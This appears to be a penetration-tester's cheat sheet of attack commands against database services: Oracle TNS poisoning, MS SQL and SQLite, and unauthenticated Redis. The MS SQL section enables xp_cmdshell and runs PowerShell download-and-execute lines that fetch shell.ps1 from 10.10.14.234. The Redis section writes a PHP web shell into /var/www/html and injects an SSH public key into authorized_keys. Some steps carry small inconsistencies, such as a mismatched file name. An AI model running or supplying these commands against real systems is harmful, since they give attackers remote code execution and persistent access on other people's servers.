## DBMS



### MySQL (MariaDB)

```
root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
```



### Oracle


#### TNS Poison

##### Nmap

```
$ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 127.0.0.1
```

##### odat

Install:

* [github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
* [github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)

```
$ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
$ git submodule init && git submodule update
$ sudo apt install libaio1 python3-dev alien python3-pip
$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-devel-19.6.0.0.0-1.x86_64.rpm
$ sudo alien --to-deb *.rpm
$ sudo dpkg -i *.deb
$ vi /etc/profile
...
export ORACLE_HOME=/usr/lib/oracle/19.6/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
...
$ pip3 install cx_Oracle
$ python3 odat.py -h
```

Usage:

* [github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)

```
$ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
```



### MS SQL


#### Enable xp_cmdshell

```
1> EXEC sp_configure 'show advanced options', 1
2> GO
1> RECONFIGURE
2> GO
1> EXEC sp_configure 'xp_cmdshell', 1
2> GO
1> RECONFIGURE
2> GO
1> EXEC sp_configure 'xp_cmdshell', 1
2> GO
1> xp_cmdshell 'whoami'
2> GO
```


#### sqsh

```
root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
2> GO
```


#### mssqlclient.py

```
root@kali:$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
```


#### mssql-cli

* [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)

```
root@kali:$ python -m pip install mssql-cli
root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
```


#### DBeaver

* [DBeaver Community](https://dbeaver.io/)


#### DbVisualizer

* [DbVisualizer](https://www.dbvis.com/)



### SQLite

```
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
SELECT username,password FROM secret_database;
```



### Redis


#### Preparation

Install **[1]** or **[2]**:

```
root@kali:$ mkdir ~/tools/redis-cli-go && cd ~/tools/redis-cli-go
root@kali:$ wget [1] -O redis-cli-go && chmod +x redis-cli-go
root@kali:$ ln -s ~/tools/redis-cli-go/redis-cli-go /usr/local/bin/redis-cli-go && cd -
```

1. [github.com/holys/redis-cli/releases](https://github.com/holys/redis-cli/releases)
2. [github.com/antirez/redis](https://github.com/antirez/redis)

Check if vulnarable:

```
root@kali:$ nc 127.0.0.1 6379
Escape character is '^]'.
echo "Hey, no AUTH required!"
$21
Hey, no AUTH required!
quit
+OK
Connection closed by foreign host.
```


#### Web Shell

```
root@kali:$ redis-cli -h 127.0.0.1 flushall
root@kali:$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/www/html/
root@kali:$ redis-cli -h 127.0.0.1 save
```

* [book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)


#### Inject SSH PubKey

```
root@kali:$ ssh-keygen -t ecdsa -s 521 -f key
root@kali:$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
root@kali:$ redis-cli -h 127.0.0.1 flushall
root@kali:$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
root@kali:$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
root@kali:$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
root@kali:$ redis-cli -h 127.0.0.1 save
```

* [packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
* [2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

